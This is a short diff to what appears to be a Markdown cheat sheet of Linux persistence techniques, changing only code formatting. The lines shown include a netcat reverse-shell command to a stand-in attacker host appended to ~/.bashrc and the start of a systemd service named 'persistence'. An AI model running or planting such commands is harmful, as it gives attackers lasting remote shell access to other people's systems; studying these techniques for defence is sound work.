@@ -88,12 +88,12 @@
 
 * Autorun
 
-    'bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc'
+    `bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc`
 
 * Service
 
-    bash#> vim /etc/systemd/system/persistence.service
-    bash$> vim ~/.config/systemd/user/persistence.service
+    `bash#> vim /etc/systemd/system/persistence.service\
+    bash$> vim ~/.config/systemd/user/persistence.service`
 
     [Unit]
     Description=persistence
